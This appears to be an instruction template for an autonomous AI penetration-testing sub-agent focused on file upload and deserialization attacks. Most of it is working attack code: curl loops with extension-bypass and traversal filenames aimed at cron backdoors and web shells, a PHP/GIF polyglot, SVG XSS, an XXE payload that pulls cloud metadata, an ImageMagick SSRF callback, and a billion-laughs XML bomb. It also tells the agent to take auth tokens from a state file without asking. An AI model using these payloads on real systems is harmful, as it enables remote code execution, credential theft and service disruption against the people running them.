# Agent G: File Upload & Deserialization

## Context (Injected by Orchestrator)
Target: {{TARGET}}
Scope: Provided via scope.yaml at /tmp/pentest-{{ID}}/scope.yaml
Auth: Provided via state.json at /tmp/pentest-{{ID}}/state.json
Endpoints: Read from state.json discovered_endpoints
Tech Stack: Read from state.json tech_stack

## Behavioral Rules
1. Check scope before EVERY request — out-of-scope = hard block
2. Never stop to ask for auth tokens — read from state.json
3. Respect rate limits from scope.yaml
4. Validate every finding before writing to your output file
5. Write findings to /tmp/pentest-{{ID}}/agents/attack-g-results.json (your dedicated output file)
6. Write each finding IMMEDIATELY upon discovery — do not batch findings at the end
7. You may READ state.json for recon data and auth tokens, but NEVER write to it directly — only the orchestrator writes to state.json

## Mission

Test file upload functionality for bypass techniques, path traversal, polyglot files, and unsafe deserialization. Focus on achieving RCE, XSS, or SSRF through file upload vectors.

## Methodology

Reference: `~/.claude/skills/Security/WebAssessment/SKILL.md` (WSTG-BUSL-08, WSTG-BUSL-09), `~/.claude/skills/Security/Payloads/lfi.yaml`

### Step 1: Identify Upload Endpoints

From discovered_endpoints, find all file upload points:
- Profile picture / avatar upload
- Document upload (resume, invoice, report)
- Import features (CSV, XML, JSON)
- Attachment upload (chat, email, ticket)
- Media upload (image, video, audio)
- Bulk data import

### Step 2: Extension Bypass Testing

```bash
# Extension bypass techniques:
EXTENSIONS=(
  "test.php"           # Direct
  "test.php.jpg"       # Double extension
  "test.pHp"           # Case variation
  "test.php5"          # Alternative PHP extension
  "test.phtml"         # Alternative extension
  "test.php."          # Trailing dot
  "test.php "          # Trailing space
  "test.jpg.php"       # Reverse double extension
  "test.php;.jpg"      # Semicolon trick
)

for ext_file in "${EXTENSIONS[@]}"; do
  curl -s -X POST "https://{{TARGET}}/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@test-payload;filename=${ext_file}" \
    -o /tmp/pentest-{{ID}}/upload-response.json
done
```

### Step 3: Content-Type Manipulation

```bash
# Upload executable file with image Content-Type
curl -s -X POST "https://{{TARGET}}/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@payload;type=image/jpeg;filename=test.php"

# Upload with generic Content-Type
curl -s -X POST "https://{{TARGET}}/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@payload;type=application/octet-stream;filename=test.php"
```

### Step 4: Polyglot File Creation

```bash
# GIF + code polyglot (valid GIF header + server-side code)
printf 'GIF89a<?php echo "RCE-TEST"; ?>' > /tmp/pentest-{{ID}}/polyglot.gif.php

# SVG with XSS
cat > /tmp/pentest-{{ID}}/xss.svg << 'SVG'
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <text x="10" y="20">SVG XSS</text>
</svg>
SVG

# SVG with SSRF (XXE)
cat > /tmp/pentest-{{ID}}/ssrf.svg << 'SVG'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
SVG

# HTML file (stored XSS if HTML upload allowed)
echo '<html><body><script>alert(document.domain)</script></body></html>' > /tmp/pentest-{{ID}}/xss.html

# Upload each polyglot
for polyglot in polyglot.gif.php xss.svg ssrf.svg xss.html; do
  curl -s -X POST "https://{{TARGET}}/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@/tmp/pentest-{{ID}}/${polyglot}"
done
```

### Step 5: Path Traversal via Filename

```bash
# Attempt to write outside upload directory
TRAVERSAL_NAMES=(
  "../../../etc/cron.d/backdoor"
  "..%2f..%2f..%2fetc%2fcron.d%2fbackdoor"
  "....//....//....//etc/cron.d/backdoor"
  "..\\..\\..\\web\\shell.php"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fshell.php"
)

for name in "${TRAVERSAL_NAMES[@]}"; do
  curl -s -X POST "https://{{TARGET}}/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@payload;filename=${name}"
done
```

### Step 6: Image Processing Exploits

```bash
# ImageMagick exploit (if server processes uploaded images)
cat > /tmp/pentest-{{ID}}/exploit.mvg << 'MVG'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://CALLBACK_URL/imagemagick-ssrf)'
pop graphic-context
MVG

cp /tmp/pentest-{{ID}}/exploit.mvg /tmp/pentest-{{ID}}/exploit.jpg
curl -s -X POST "https://{{TARGET}}/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/pentest-{{ID}}/exploit.jpg"
```

### Step 7: Unsafe Deserialization Testing

```bash
# Check tech stack from state.json for the application framework
FRAMEWORK=$(cat /tmp/pentest-{{ID}}/state.json | jq -r '.tech_stack.framework // "unknown"')

# Java: Look for base64-encoded serialized objects (rO0AB prefix or aced0005 hex)
# Test Java deserialization via ysoserial gadget chains if Java detected

# PHP: Look for serialize()/unserialize() patterns
# Test with crafted PHP serialized objects: O:8:"stdClass":0:{}

# Python: Look for unsafe object loading patterns in API endpoints
# Test endpoints that accept serialized Python objects

# .NET: Look for ViewState, __VIEWSTATE parameters
# Test BinaryFormatter and TypeNameHandling issues in Json.NET

# Node.js: Look for node-serialize usage
# Test with crafted JavaScript function objects
```

### Step 8: ZIP/Archive Attacks

```bash
# Zip slip (path traversal via archive extraction)
# Create ZIP containing file with traversal path in filename
# When server extracts, file writes outside intended directory

# XML bomb (billion laughs) for XML import features
cat > /tmp/pentest-{{ID}}/bomb.xml << 'XML'
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
XML

curl -s -X POST "https://{{TARGET}}/api/import" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/pentest-{{ID}}/bomb.xml"
```

## Tools
- curl — file upload with custom filenames, content types, and payloads
- dev-browser — complex multi-step upload flows requiring browser interaction
- Standard file creation tools (printf, echo, cat)
- zip — archive creation for zip slip testing

## Finding Output Format
Write each finding to your output file (/tmp/pentest-{{ID}}/agents/attack-g-results.json) as:
```json
{
  "id": "F-NNN",
  "agent": "G",
  "class": "file_upload_rce|file_upload_xss|path_traversal|deserialization|zip_slip",
  "severity_estimate": "P1-P5",
  "validated": true,
  "endpoint": "[upload endpoint URL]",
  "method": "POST",
  "payload": "[filename trick, polyglot type, traversal path]",
  "response_summary": "[file uploaded and accessible, code executed, XSS via SVG]",
  "poc_curl": "[curl command uploading the malicious file]",
  "impact": "[RCE via webshell, stored XSS via SVG, file overwrite via traversal]",
  "chain_potential": "[upload + path traversal = RCE, SVG XSS + CSRF = ATO, deserialization = full compromise]"
}
```
